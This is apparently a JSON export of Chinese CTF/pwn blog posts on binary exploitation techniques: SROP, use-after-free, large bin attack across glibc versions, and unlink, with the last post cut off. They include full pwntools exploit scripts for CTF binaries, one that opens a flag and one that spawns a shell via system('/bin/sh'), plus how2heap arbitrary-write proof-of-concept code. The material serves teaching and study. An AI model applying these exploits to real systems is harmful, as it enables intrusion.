[{"title":"SROP","url":"/2025/06/17/SROP/","content":"\n\n高级ROP之SROP一、知识储备1. signal 机制\n这里基础知识就搬运ctfwiki上的了。\n\nsignal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：基本步骤如下：\n\n内核向某个进程发送signal信号，该进程会被暂时挂起，进入内核态。\n内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。 此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。 之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。\nsignal handler 返回后，**内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。**其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。\n\n简单来说就是：先保存各个寄存器中的值（Signal Frame），然后挂起用户进程，然后执行信号处理函数，处理完之后恢复栈和各个寄存器让后继续执行用户进程。\n2.漏洞利用可以注意到：Signal Frame是保存在用户空间上的，对用户来说是可读可写的，而且内核与信号处理程序没有直接关联 ，它并不会去记录每个 signal 所对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。也就是说，我们可以通过伪造 Signal Frame来控制各个寄存器的值以此来达到攻击的目的。比如说：\nrax = 0x3B（execve）rdi=&#x27;/bin/sh\\00&#x27;rsi=0x0rdx=0x0rip=syscall\n这样就可以成功getshell。\n\nSignal Frame看起来十分庞大，但是使用pwntools可以快捷构造我们所需要的Signal Frame\n\n二、例题分析\n附件放在文末\n\n拿到题还是先检查一下保护信息，然后运行一下看看。ida分析main（）rt_sigreturn（)禁用了execve和execveat这两个系统调用，意味着我们很难getshell，所以使用ORW的方式来读取flag。这道题还有现成的sigreturn。要实现ORW，我们就要构造SROP链。我们先通过一个sigreturn把栈迁移到已知段，这个段要足够长，足以放下Signal Frame，所以.bss段就是一个很好的选择。首先我们做一些准备工作，通过ida静态调试，我们拿到了 sigreturn 的地址：sigreturn_sddr = 0x401296、syscall_ret的地址syscall_addr = 0x40129D和bss段的起始地址：0x404060，为了防止我们的操作更改了bss段比较重要的一些进程的数据，我们给这个地址加上一段偏移再使用：bss_addr = 0x404060 + 0x300。然后我们执行栈迁移和第二次read操作，通过IDA的数据可知，我们们需要填充0x28个字节的垃圾数据，所以payload1如下：\nframe1 = SigreturnFrame()frame1.rip = syscall_addrframe1.rbp = bss_addr + 0x8frame1.rsp = bss_addr + 0x8frame1.rax = constants.SYS_readframe1.rdi = 0frame1.rsi = bss_addrframe1.rdx = 0x400payload1 = b&#x27;A&#x27;*padding + p64(sigreturn_sddr) + (bytes(frame1))p.sendline(payload1)\n部分解释：bss_addr + 0x8是因为后面我们需要传入‘flag\\x00\\x00\\x00\\x00’下一步我们要进行orw操作先构造open部分：\nframe2 = SigreturnFrame()frame2.rip = syscall_addrframe2.rbp = bss_addr + 0x8 + 0x100frame2.rsp = bss_addr + 0x8 + 0x100frame2.rax = constants.SYS_openframe2.rdi = bss_addrframe2.rsi = 0x0frame2.rdx = 0x0payload2 = b&#x27;flag&#x27; + b&#x27;\\x00&#x27;*0x4 + p64(sigreturn_sddr) + (bytes(frame2))\n然后是read部分：\nframe3 = SigreturnFrame()frame3.rip = syscall_addrframe3.rbp = bss_addr + 0x8 + 0x208frame3.rsp = bss_addr + 0x8 + 0x200frame3.rax = constants.SYS_readframe3.rdi = 0x3frame3.rsi = bss_addrframe3.rdx = 0x30payload3 =  p64(sigreturn_sddr) + (bytes(frame3))\n最后是write部分：\nframe4 = SigreturnFrame()frame4.rip = syscall_addrframe4.rax = constants.SYS_writeframe4.rdi = 0x1frame4.rsi = bss_addrframe4.rdx = 0x30payload4 =  p64(sigreturn_sddr) + (bytes(frame4))\n所以总的payload如下：\nframe2 = SigreturnFrame()frame2.rip = syscall_addrframe2.rbp = bss_addr + 0x8 + 0x100frame2.rsp = bss_addr + 0x8 + 0x100frame2.rax = constants.SYS_openframe2.rdi = bss_addrframe2.rsi = 0x0frame2.rdx = 0x0payload2 = b&#x27;flag&#x27; + b&#x27;\\x00&#x27;*0x4 + p64(sigreturn_sddr) + (bytes(frame2))frame3 = SigreturnFrame()frame3.rip = syscall_addrframe3.rbp = bss_addr + 0x8 + 0x208frame3.rsp = bss_addr + 0x8 + 0x200frame3.rax = constants.SYS_readframe3.rdi = 0x3frame3.rsi = bss_addrframe3.rdx = 0x30payload3 =  p64(sigreturn_sddr) + (bytes(frame3))frame4 = SigreturnFrame()frame4.rip = syscall_addrframe4.rax = constants.SYS_writeframe4.rdi = 0x1frame4.rsi = bss_addrframe4.rdx = 0x30payload4 =  p64(sigreturn_sddr) + (bytes(frame4))pause()p.send(payload2 + payload3 + payload4)\n所以总的exp如下：\nfrom pwn import *if __name__ == &quot;__main__&quot;:    context.log_level = &#x27;debug&#x27;    context.arch = &#x27;amd64&#x27;    context.os = &#x27;linux&#x27;    libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)    elf=ELF(&#x27;./srop&#x27;)    p = process(&#x27;./srop&#x27;)    padding = 0x28    bss_addr = 0x404060 + 0x300    sigreturn_sddr = 0x401296    syscall_addr = 0x40129D    frame1 = SigreturnFrame()    frame1.rip = syscall_addr    frame1.rbp = bss_addr + 0x8    frame1.rsp = bss_addr + 0x8    frame1.rax = constants.SYS_read    frame1.rdi = 0    frame1.rsi = bss_addr    frame1.rdx = 0x400    payload1 = b&#x27;A&#x27;*padding + p64(sigreturn_sddr) + (bytes(frame1))    p.sendline(payload1)    frame2 = SigreturnFrame()    frame2.rip = syscall_addr    frame2.rbp = bss_addr + 0x8 + 0x100    frame2.rsp = bss_addr + 0x8 + 0x100    frame2.rax = constants.SYS_open    frame2.rdi = bss_addr    frame2.rsi = 0x0    frame2.rdx = 0x0    payload2 = b&#x27;flag&#x27; + b&#x27;\\x00&#x27;*0x4 + p64(sigreturn_sddr) + (bytes(frame2))    frame3 = SigreturnFrame()    frame3.rip = syscall_addr    frame3.rbp = bss_addr + 0x8 + 0x208    frame3.rsp = bss_addr + 0x8 + 0x200    frame3.rax = constants.SYS_read    frame3.rdi = 0x3    frame3.rsi = bss_addr    frame3.rdx = 0x30    payload3 =  p64(sigreturn_sddr) + (bytes(frame3))    frame4 = SigreturnFrame()    frame4.rip = syscall_addr    frame4.rax = constants.SYS_write    frame4.rdi = 0x1    frame4.rsi = bss_addr    frame4.rdx = 0x30    payload4 =  p64(sigreturn_sddr) + (bytes(frame4))    pause()    p.send(payload2 + payload3 + payload4)    p.interactive()\n附件\n","categories":["PWN"],"tags":["srop","ret2syscall"]},{"title":"UAF初识","url":"/2025/06/17/UAF%E5%88%9D%E8%AF%86/","content":"\n\nUAF漏洞漏洞简介UAF —— Use After Free：其内容如同其名称，free后进行再利用。UAF是堆结构漏洞的一种重要的利用方式。在程序中，UAF常有以下几种情况：\n\n内存块被释放后，其对应的指针被设置为 NULL，然后再次使用，自然程序会崩溃。\n内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。\n内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。\nDangling Pointer（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。\n\n\n\n下面我将通过一道简单的例题展示一下UAF的攻击。\n例题分析\n题目来源：actf_2019_babyheap（UAF）\n\n拿到题先检查保护信息，然后运行一下。这是一道菜单题，没有开启PIE。然后用ida反编译一下，定位到 main函数。经过我们的逆向之后，代码是这个样子的。main函数：menu函数：可以看到该函数调用了system函数，我们再检索一下字符串，发现了/bin/sh。由于这道题没有开启PIE，所以system函数的地址和/bin/sh的地址我们就取得了，后续可能会有用。creat:creat函数先是malloc了一个0x10大小的堆块，然后把用户malloc的堆块的地址和print_context的地址存入该堆块。print_content：delete：可见delete函数中再free掉堆块之后并没有将指针设置为NULL，说明程序中可能存在UAF漏洞。show：可以看到，show函数是通过调用函数指针来输出数据的，而这个函数的地址储存在ptr[index][2]处，参数储存在ptr[index][1]处。那么思路就十分明确了。我们可以先创造2个任意大小的堆块（远离0x10即可），然后free掉他们。然后再创建一个0x10（或者0x18）大小的堆块，通过修堆块的内容为binsh_addr和system_addr然后再执行show(0)就可以了。说的可能有点晦涩难懂，以下是具体解释。在我们申请两个堆块之后，大致情况如下。然后我们再把这两个堆块free掉，再次申请0x10（0x18）大小的堆块。此时由于堆管理机制，我们申请得到的struct3就是原来的struct2，content的堆块就是原来的struct1（后入先出），这样我们就可以把原来的content地址改为binsh的地址，print_content的地址改为system的地址，然后再show(0)就能够getshell（struct1的index为0)。那么具体的exp如下：\nfrom pwn import *def create(size, content):    p.sendlineafter(&#x27;Your choice:&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Please input size:&#x27;, str(size))    p.sendafter(&#x27;Please input content: &#x27;, content)def delete(idx):    p.sendlineafter(&#x27;Your choice:&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Please input list index:&#x27;, str(idx))def show(idx):    p.sendlineafter(&#x27;Your choice:&#x27;, &#x27;3&#x27;)    p.sendlineafter(&#x27;Please input list index:&#x27;, str(idx))if __name__ == &#x27;__main__&#x27;:    context(log_level=&#x27;debug&#x27; , os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)    pwnfile = &#x27;./uaf&#x27;    p = process(pwnfile)    elf = ELF(pwnfile)\t    sys_addr = 0x4007A0    binsh_addr = 0x602010\t    create(0x100, &#x27;a&#x27;*0x100)    create(0x100, &#x27;b&#x27;*0x100)    delete(0)    delete(1)    create(0x10, p64(binsh_addr) + p64(sys_addr))    show(0)    p.interactive()","categories":["PWN"],"tags":["heap","UAF"]},{"title":"LargeBinAttack高低版本的利用","url":"/2025/06/17/LargeBinAttack/","content":"\n\nLargeBinAttack概述Large bin attack 自然是作用于 Large bin的，该攻击手段适用于目前所有版本的libc（高低版本略有不同）。glibc 2.30是一个分水岭，这个攻击比Unsorted Bin Attack 更为强大，它能实现将一个堆的头地址写入一个任意地址。\nLarge Bin 基础基础概念large bin是一种堆分配的管理机制，是双向链表，用于管理大于某个特定大小阈值的内存块。一般而言，进入large bin的最低字节为0x200(512)，但是由于引入了tcache，使得在tcache尚未填满之前的情况下，进入large bin的最低字节为0x410（不含chunk头），所以一般我们设置大堆块都是0x410起步的。\n结构large bin中含有63个链表，而large bins **总体又被分成了6个组，**每个组对应一个区间，且容纳的堆块数量指数型减少，示意图如下\n\n说完组成部分，我们来看链表结构\n\n\n在large_bin中的排列顺序是从大到小的顺序，所以越大的chunk越靠前，越小的chunk越靠后，最小的chunk指向main_arena+一定偏移。也就是说，非尾部的fd_nextsize指向的是更小的chunk，非头部的bk_nextsize指向的是更大的chunk\n\n在相同大小的情况下，按照free的时间进行排序\n\n只有首堆块的fd_nextsize,bk_nextsize会指向其它大小的堆块，而其后的堆块中fd_nextsize,bk_nextsize无效，通常为0\n\n\nglibc-2.30之前版本的攻击方式适用条件能够**修改释放后的堆的内容，**一般来说是UAF或者堆溢出居多\n漏洞点分析// victim是当前即将进入 large bin 的堆块if ((unsigned long)(size) &lt; (unsigned long)chunksize_nomask(bck-&gt;bk)) &#123;    // 如果victim的size小于当前链表中某chunk的size    // 将victim插入到该chunk之前，维护nextsize链表    victim-&gt;fd_nextsize = bck;    victim-&gt;bk_nextsize = bck-&gt;bk_nextsize;    bck-&gt;bk_nextsize = victim;    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;else&#123;    // 如果victim的size大于等于链表中所有chunk的size    // 将victim插入到链表尾部    victim-&gt;fd_nextsize = fwd;    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;    fwd-&gt;bk_nextsize = victim;    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;// 将bck指向fwd-&gt;bk，为后续主链表插入做准备bck = fwd-&gt;bk;// ...existing code...\n\n我们要利用的就是这个else分支，进入这个else分支的具体条件是 victim的size在large bin链表中找不到相等的节点，且比fwd-&gt;nextsize小，比 fwd 大时，才会进入该分支**（如果当前的large bin中没有比vitim大的堆块就会把vitim插入链表头）**。\n实例分析这里使用how2heap的源码演示\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt; int main()&#123;    setbuf(stdout, NULL);    printf(&quot;本文件演示了通过large bin攻击将一个大的unsigned long值写入栈中\\n&quot;);    printf(&quot;实际上，large bin攻击通常是为进一步攻击做准备，比如重写libc中的全局变量global_max_fast以进行后续的fastbin攻击\\n\\n&quot;);    unsigned long stack_var1 = 0;    unsigned long stack_var2 = 0;    printf(&quot;首先来看一下我们想要在栈上重写的目标:\\n&quot;);    printf(&quot;stack_var1 (%p): %ld\\n&quot;, &amp;stack_var1, stack_var1);    printf(&quot;stack_var2 (%p): %ld\\n\\n&quot;, &amp;stack_var2, stack_var2);    unsigned long *p1 = malloc(0x420);    printf(&quot;现在，我们在堆上分配第一个large chunk，地址为: %p\\n&quot;, p1 - 2);    printf(&quot;并且分配另一个fastbin块，以避免在free()时下一个large chunk与第一个large chunk合并\\n\\n&quot;);    malloc(0x20);    unsigned long *p2 = malloc(0x500);    printf(&quot;然后，我们在堆上分配第二个large chunk，地址为: %p\\n&quot;, p2 - 2);    printf(&quot;并且分配另一个fastbin块，以避免在free()时下一个large chunk与第二个large chunk合并\\n\\n&quot;);    malloc(0x20);    unsigned long *p3 = malloc(0x500);    printf(&quot;最后，我们在堆上分配第三个large chunk，地址为: %p\\n&quot;, p3 - 2);    printf(&quot;并且分配另一个fastbin块，以避免在free()时top chunk与第三个large chunk合并\\n\\n&quot;);    malloc(0x20);    free(p1);    free(p2);    printf(&quot;现在我们释放第一个和第二个large chunk，它们将被插入到unsorted bin中:&quot;           &quot; [ %p &lt;--&gt; %p ]\\n\\n&quot;, (void *)(p2 - 2), (void *)(p2[0]));    malloc(0x90);    printf(&quot;现在，我们分配一个比已释放的第一个large chunk更小的块。这会将已释放的第二个large chunk移入large bin freelist，&quot;            &quot;使用已释放的第一个large chunk的一部分进行分配，并将剩余部分重新插入unsorted bin:&quot;            &quot; [ %p ]\\n\\n&quot;, (void *)((char *)p1 + 0x90));    free(p3);    printf(&quot;现在，我们释放第三个large chunk，它将被插入到unsorted bin中:&quot;           &quot; [ %p &lt;--&gt; %p ]\\n\\n&quot;, (void *)(p3 - 2), (void *)(p3[0]));     //------------VULNERABILITY-----------    // 现在模拟一个漏洞，可以覆盖已释放的第二个large chunk的“size”以及它的“bk”和“bk_nextsize”指针    printf(&quot;现在模拟一个漏洞，可以覆盖已释放的第二个large chunk的“size”以及它的“bk”和“bk_nextsize”指针\\n&quot;);    printf(&quot;基本思路是减小已释放的第二个large chunk的size，强制malloc将已释放的第三个large chunk插入large bin freelist的头部。&quot;            &quot;为了覆盖栈变量，我们将“bk”设置为stack_var1之前16字节，将“bk_nextsize”设置为stack_var2之前32字节\\n\\n&quot;);    p2[-1] = 0x3f1;    p2[0] = 0;    p2[2] = 0;    p2[1] = (unsigned long)(&amp;stack_var1 - 2);// bk    p2[3] = (unsigned long)(&amp;stack_var2 - 4);// bk_nextsize    //------------------------------------    malloc(0x90);     printf(&quot;我们再malloc一次，这样已释放的第三个large chunk会被插入large bin freelist。&quot;            &quot;此时目标变量应该已经被重写:\\n&quot;);    printf(&quot;stack_var1 (%p): %p\\n&quot;, &amp;stack_var1, (void *)stack_var1);    printf(&quot;stack_var2 (%p): %p\\n&quot;, &amp;stack_var2, (void *)stack_var2);    // 完整性检查    assert(stack_var1 != 0);    assert(stack_var2 != 0);    return 0;&#125;\n\n输出和注释我已经替换成中文了，很好理解\n我们直接看最关键的一步，在更改 p2 的信息前下断点，看一看此时的堆布局\n\n这个时候的 p2 是这个样子的\n\n更改之后，我们来看一看\n\n最后再次malloc的时候，就把 p3 链入链表 ，这个时候就有\nfwd -&gt; bk -&gt; fd = p3\nfwd -&gt; bk_nextszie -&gt; fd_nextsize = p3\n所以 **0x7fffffffe390 + 0x10 &#x3D; 7fffffffe3a0 **的地址和 **7fffffffe388 + 0x20 &#x3D; 7fffffffe3a8 **的地址会出现p3的地址\n\n至此，我们就完成了这一攻击\nglibc-2.30之后版本的攻击方式glibc2.30之后，对Largebin的插入新增了一个检测\nelse&#123;       victim-&gt;fd_nextsize = fwd;       victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;       if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))               malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);       fwd-&gt;bk_nextsize = victim;       victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;&#125;bck = fwd-&gt;bk;if (bck-&gt;fd != fwd)       malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);\n\n在 glibc2.30中，新增了对双向链表完整性的检查，但是通过阅读源码，我们能够发现以下代码\nassert (chunk_main_arena (bck-&gt;bk));//断言bck-&gt;bk属于main_arenaif ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;       fwd = bck; //这里的fwd可以粗略的认为是large_bin归属的main_arena       bck = bck-&gt;bk; //bck成了main_arena的bk指针指向的堆块(当前链表中最小的那个堆块)       victim-&gt;fd_nextsize = fwd-&gt;fd; //我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块       victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;//攻击点，没有检测，所以我们可以伪造大堆块的bk_nextsize       fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; //先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim&#125;\n\n这段代码是当插入的堆块 &lt; 当前链表最小的堆块的时候执行的逻辑，我们可以看到，这一步没有对 next_size双向链表合法性的检测，因此我们可以修改bk_nextsize，再次实现向目标地址写入一个堆地址。\n实例分析我们还是用 how2heap的源码进行调试\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt;/*A revisit to large bin attack for after glibc2.30Relevant code snippet :\tif ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;\t\tfwd = bck;\t\tbck = bck-&gt;bk;\t\tvictim-&gt;fd_nextsize = fwd-&gt;fd;\t\tvictim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;\t\tfwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;\t&#125;*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;  /*Disable IO buffering to prevent stream from interfering with heap*/  setvbuf(stdin,NULL,_IONBF,0);  setvbuf(stdout,NULL,_IONBF,0);  setvbuf(stderr,NULL,_IONBF,0);  // 原始输出保留不变  printf(&quot;\\n\\n&quot;);  printf(&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\\n\\n&quot;);  printf(&quot;Check 1 : \\n&quot;);  printf(&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\\n&quot;);  printf(&quot;&gt;        malloc_printerr (\\&quot;malloc(): largebin double linked list corrupted (nextsize)\\&quot;);\\n&quot;);  printf(&quot;Check 2 : \\n&quot;);  printf(&quot;&gt;    if (bck-&gt;fd != fwd)\\n&quot;);  printf(&quot;&gt;        malloc_printerr (\\&quot;malloc(): largebin double linked list corrupted (bk)\\&quot;);\\n\\n&quot;);  printf(&quot;This prevents the traditional large bin attack\\n&quot;);  printf(&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \\n\\n&quot;);    printf(&quot;====================================================================\\n\\n&quot;);  size_t target = 0;  // 目标覆盖地址  printf(&quot;Here is the target we want to overwrite (%p) : %lu\\n\\n&quot;,&amp;target,target);  // 分配第一个large chunk并设置保护块  size_t *p1 = malloc(0x428);  // 分配0x428大小的块（属于large bin）  printf(&quot;First, we allocate a large chunk [p1] (%p)\\n&quot;,p1-2);  size_t *g1 = malloc(0x18);   // 小块保护防止合并  printf(&quot;And another chunk to prevent consolidate\\n&quot;);  // 分配第二个较小的large chunk并设置保护块  size_t *p2 = malloc(0x418);  // 分配0x418大小的块（比p1小但同属large bin）  printf(&quot;We also allocate a second large chunk [p2]  (%p).\\n&quot;,p2-2);  printf(&quot;This chunk should be smaller than [p1] and belong to the same large bin.\\n&quot;);  size_t *g2 = malloc(0x18);   // 小块保护防止合并  printf(&quot;Once again, allocate a guard chunk to prevent consolidate\\n&quot;);  // 释放顺序和large bin插入触发  free(p1);                    // 先释放较大的块  printf(&quot;Free the larger of the two --&gt; [p1] (%p)\\n&quot;,p1-2);  size_t *g3 = malloc(0x438);  // 分配更大的块触发p1插入large bin  printf(&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\\n&quot;);  // 释放较小块并进入unsorted bin  free(p2);                    // 释放较小的块  printf(&quot;Free the smaller of the two --&gt; [p2] (%p)\\n&quot;,p2-2);  printf(&quot;At this point, we have one chunk in large bin [p1] (%p),\\n&quot;,p1-2);  printf(&quot;and one chunk in unsorted bin [p2] (%p)\\n&quot;,p2-2);  // 关键的漏洞利用点 - 修改bk_nextsize指针  p1[3] = (size_t)((&amp;target)-4);  // 伪造large bin链表指针  printf(&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\\n&quot;,(&amp;target)-4);  // 触发第二次large bin插入并完成地址覆盖  size_t *g4 = malloc(0x438);     // 分配大于p2的块触发插入  printf(&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\\n&quot;, p2-2, p2-2);  printf(&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\\n&quot;);  printf(&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\\n&quot;);  printf(&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\\n&quot;, p2-2, p1-2, p2-2);  // 验证漏洞利用结果  printf(&quot;\\n&quot;);  printf(&quot;In our case here, target is now overwritten to address of [p2] (%p), [target] (%p)\\n&quot;, p2-2, (void *)target);  printf(&quot;Target (%p) : %p\\n&quot;,&amp;target,(size_t*)target);  printf(&quot;\\n&quot;);  printf(&quot;====================================================================\\n\\n&quot;);  assert((size_t)(p2-2) == target);  // 验证地址是否成功覆盖  return 0;&#125;\n\n我们在70行下断点，查看堆信息\n\n然后，修改p1的bk_nextsize为target_addr - 0x20，再次查看堆块信息\n\n然后申请一个大于p2的堆块，使得p2被链入 largebin，触发 LargeBinAttack 这个时候再来查看堆块的信息，和target的情况。\n\n此时成功将p2的地址写入了 target ， 完成了LargeBinAttack\n总结低版本的LargeBinAttack 主要就是没有双向链表合法性的检查。因此，我们可以伪造较小堆块的bk和bk_nextsize，然后大堆块在经过malloc后放进large_bins里，就能通过修改fd和bk的方式完成了任意地址写。之后可以结合其它House of 系列进行攻击。\n版本来到2.30以后，由于引入了新的检测机制，就只能改最小堆块的bk_nextsize，然后插入更小的堆块来触发攻击。\n","categories":["PWN"],"tags":["heap","LargeBinAttack"]},{"title":"Unlink","url":"/2025/06/17/Unlink/","content":"\n\n一、 Unlink介绍Unlink被定义为一个宏（高版本libc中被定义为了静态函数 unlink_chunk)，其源码如下\n/*  * 从双向链表中安全移除节点P的宏 * AV: 分配区指针，用于错误处理 * P: 要移除的节点指针 * BK: 临时存储后驱节点指针 * FD: 临时存储前驱节点指针 */#define unlink(AV, P, BK, FD) &#123;                                                /* 获取P的前驱和后继节点 */                                          FD = P-&gt;fd;\t\t\t\t\t\t\t\t          BK = P-&gt;bk;\t\t\t\t\t\t\t\t              /* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);          /* 链表完整性验证通过，执行移除操作 */          else &#123;\t\t\t\t\t\t\t\t              /* 基本链表操作：让前驱和后继互相指向，跳过P */          FD-&gt;bk = BK;\t\t\t\t\t\t\t              BK-&gt;fd = FD;\t\t\t\t\t\t\t                      /* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */        if (!in_smallbin_range (P-&gt;size)\t\t\t\t                  &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\t\t                  /* 检查大小链表的完整性 */\t    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)\t      \t\t|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \t      malloc_printerr (check_action,\t\t\t\t      \t\t\t       &quot;corrupted double-linked list (not small)&quot;,    \t\t\t       P, AV);\t\t\t\t\t                              /* 如果后继节点的大小链表指针为空，需要重建 */                  if (FD-&gt;fd_nextsize == NULL) &#123;\t\t\t\t                      /* 情况1：P是唯一节点，让后继节点自环 */                      if (P-&gt;fd_nextsize == P)\t\t\t\t                        FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\t\t                      /* 情况2：将P的大小链表指针转移给后继节点 */                else &#123;\t\t\t\t\t\t\t                          FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t\t                          FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t\t                          P-&gt;fd_nextsize-&gt;bk_nextsize = FD; /* 更新后节点的后驱 */                          P-&gt;bk_nextsize-&gt;fd_nextsize = FD; /* 更新前节点的前驱 */                        &#125;\t\t\t\t\t\t\t                    &#125;             /* 如果后继已有大小链表指针，直接跳过P */                  else &#123;\t\t\t\t\t\t\t                      P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t                      P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t                    &#125;\t\t\t\t\t\t\t\t                &#125;\t\t\t\t\t\t\t\t            &#125;\t\t\t\t\t\t\t\t\t      &#125;\nUnlink是堆管理中的一个操作，用于将一个chunk从双向链表中取出。触发unlink，往往是通过free物理相邻的下一块chunk，检查到该chunk的上一块处于free状态（size的prev_inuse为0)，就用unlink将上一块脱链后合并。\n实现过程如下图。（图画的丑陋，别喷）当我们执行Unlink将chunk2从双向链表中取出的时候，这个双向链表就变成下面这个样子。\n漏洞点： 如果我们可以伪造chunk2，通过控制fd和bk的值，我们似乎就可以实现任意地址写。但是事情并非如此简单，通过上面给出的源码可以看到，Unlink内部做了许多保护和限制，下面我们就来研究这些保护以及限制。\n二、 保护和限制1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))这部分检测源码如下：\n/* 获取下一个块的指针 */nextchunk = chunk_at_offset(p, size);/* 检查下一个块的prev_size是否等于当前块size */if (__builtin_expect(nextchunk-&gt;prev_size != size, 0))    malloc_printerr(&quot;corrupted size vs. prev_size&quot;);\n\n这部分检测检查的是下一个chunk的prev_size是否和当前堆块的prev_size相等（这是free函数中的检测）\n\n2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P这部分检测源码如下：\n/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */  if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t          malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);      /* 链表完整性验证通过，执行移除操作 */        else &#123;\t\t\t\t\t\t\t\t            /* 基本链表操作：让前驱和后继互相指向，跳过P */        FD-&gt;bk = BK;\t\t\t\t\t\t\t            BK-&gt;fd = FD;\t\t\t\t\t\t\t     \n其实就是在检测这个双向链表的结构是否完整。\n3. not small这部分检测源码如下：\n/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */      if (!in_smallbin_range (P-&gt;size)\t\t\t\t                &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\t\t                /* 检查大小链表的完整性 */   if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)\t      || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))         malloc_printerr (check_action,\t\t\t\t      \t       &quot;corrupted double-linked list (not small)&quot;,    \t       P, AV);\t\t\t\t\t      \n简单来说，如果chunk的大小落在largebin范围内，就会进行对nextsize的检查\n三、 适用场景及绕过方法适用场景（一般来说）\n有一个list专门用于存户malloc得到的指针\n存在溢出漏洞\n\n保护绕过（以上面讲的适用场景为例）保护1通过溢出，对下一个堆块进行修改，使得下一个堆块的prev_size &#x3D; fackchcunk的size，prev_inuse &#x3D; 0保护2对于保护2，可以通过构造facck chunk来绕过。chunk_list存在的时候，我们做以下构造fack chunk的fd指向 存放当前堆块指针的地址 -0x18（bk指针相对于chunk头的偏移是0x18)fack chunk的bk指向 存放当前堆块指针的地址 -0x10（fd指针相对于chunk头的偏移是0x10)这样就实现了 